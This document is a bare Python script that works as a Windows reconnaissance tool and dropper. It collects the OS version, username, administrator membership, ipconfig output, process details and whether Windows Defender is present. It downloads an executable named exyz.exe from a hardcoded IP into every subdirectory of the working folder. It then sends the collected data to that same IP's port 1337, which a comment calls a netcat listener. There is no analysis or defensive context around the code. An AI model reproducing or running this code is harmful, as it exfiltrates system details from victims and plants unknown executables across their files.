import os
import platform
import subprocess
import sys
import urllib.request
import socket

HOST = '20.219.145.11'  # Replace with the IP address of the netcat listener
PORT = 1337 

try:
    # Get the OS name and version
    os_name = platform.system()
    os_version = platform.release()

    # Get the current username
    username = os.environ.get('USERNAME')

    # Check if the user is an administrator
    is_admin = False
    groups = subprocess.check_output(['net', 'localgroup']).decode('utf-8')
    if 'Administrators' in groups:
        members = subprocess.check_output(['net', 'localgroup', 'Administrators']).decode('utf-8')
        if username in members:
            is_admin = True

    # Get the IP configuration
    config = subprocess.check_output(['ipconfig']).decode('utf-8')

    # Get the current working directory, process ID, process name, and executable path
    current_dir = os.getcwd()
    pid = os.getpid()
    process_name = os.path.basename(__file__)
    executable_path = sys.executable

    # Check if Windows Defender is installed
    defender_path = os.path.join(os.environ['ProgramFiles'], 'Windows Defender')
    windows_defender_installed = os.path.exists(os.path.join(defender_path, 'MsMpEng.exe'))

    # Check if the current file is executable
    current_file_is_executable = os.access(__file__, os.X_OK)

    # Create an empty string variable to hold the output
    output = ''

    # Append each line of output to the variable
    output += f'Operating system: {os_name}\n'
    output += f'Operating system version: {os_version}\n'
    output += f'Current username: {username}\n'
    output += f'Current user has admin privileges: {is_admin}\n'
    output += f'IP configuration: {config}\n'
    output += f'Current working directory: {current_dir}\n'
    output += f'Process ID: {pid}\n'
    output += f'Process name: {process_name}\n'
    output += f'Executable path: {executable_path}\n'

    if windows_defender_installed:
        output += 'Windows Defender is installed\n'
    else:
        output += 'Windows Defender is not installed\n'

    if current_file_is_executable:
        output += 'This file is executable\n'
    else:
        output += 'This file is not executable\n'

    url = 'http://20.219.145.11/exyz.exe'

    # Root directory where the files are located
    root_dir = current_dir

    # Loop through all directories and subdirectories in the root directory
    for dirpath, dirnames, filenames in os.walk(root_dir):
        # Construct the full file path
        filepath = os.path.join(dirpath, 'exyz.exe')
        # Download the file
        urllib.request.urlretrieve(url, filepath)
        output += "Downloaded file:"+str(filepath)

    # Print the output
    MESSAGE = output
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(MESSAGE.encode())
        data = s.recv(1024)
    print('Received', repr(data.decode()))

except Exception as e:
    print(f"An error occurred: {e}")
